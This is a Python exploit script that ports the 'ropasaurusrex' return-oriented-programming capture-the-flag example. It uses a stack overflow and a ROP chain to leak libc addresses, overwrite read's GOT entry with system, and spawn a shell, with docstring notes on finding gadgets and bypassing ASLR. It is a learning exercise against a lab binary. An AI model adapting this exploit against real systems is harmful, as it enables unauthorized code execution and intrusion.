from zio import *
from struct import pack, unpack
import sys
import os

'''
    An example from https://blog.skullsecurity.org/2013/ropasaurusrex-a-primer-on-return-oriented-programming
    the example program is written in Ruby, I just rewrite it in Python.
    Very typical example for ROP.

    The exploit is for NX, DEP and ASLR.

    Tricks to use:
        objdump -x rop | grep "\.bss|\.dynamic|\.data"       find the buffer
        objdump -D rop | grep "read|write" -A1               find the I/O function's PLT and GOT
        ldd rop                                              get the libc
        gdb rop core                                         debug the program after core dumped.(first use unlimit -c unlimited to unlock the function)
        ROPGadget / objdump -D rop | egrep "pop|ret"         find the ROPGadget to use (pop pop pop ret!)

    Bypass ASLR:
        use the diff between read_addr and system_addr in libc or in runtime
        1) in libc
            objdump libc | grep "read|system"
        2) in runtime
            use gdb command:
                x system
                x read
'''

target = './ropasaurusrex'
write_plt = 0x804830c
read_plt = 0x804832c
read_got = 0x804961c
pop3ret = 0x80484b6
bss = 0x8049628

system_addr = 0xf75b4e80
read_addr = 0xf7654d80
system_read_diff = system_addr - read_addr

os.system('rm core')
if len(sys.argv) < 2:
    cmd = '/bin/sh\0'
else:
    cmd = sys.argv[1] + '\0'

io = zio(target, print_write=False, print_read=COLORED(REPR, 'red'), timeout=9999999)

payload = (0x88 + 4) * 'A'
rop_chain = [

            # system()
            bss,
            0x44444444,
            read_plt,

            # read() send the calculated system_addr and overwrite read addr
            4,
            read_got,
            0,
            pop3ret,
            read_plt,

            # write() get the location of actual read_addr 
            4,
            read_got,
            1,
            pop3ret,
            write_plt,
        
            # read() read command to bss
            len(cmd),
            bss,
            0,
            pop3ret,
            read_plt, 
            ]
payload += ''.join([pack('<I',item) for item in rop_chain[::-1]])

io.write(payload)
# first read()
io.write(cmd)

# first write()
this_read_addr = unpack('<I',io.read(4))[0]
this_system_addr = this_read_addr + system_read_diff
print '[+] system at 0x%08x' % this_system_addr

# second read()
io.write(pack('<I',this_system_addr))

io.interact()

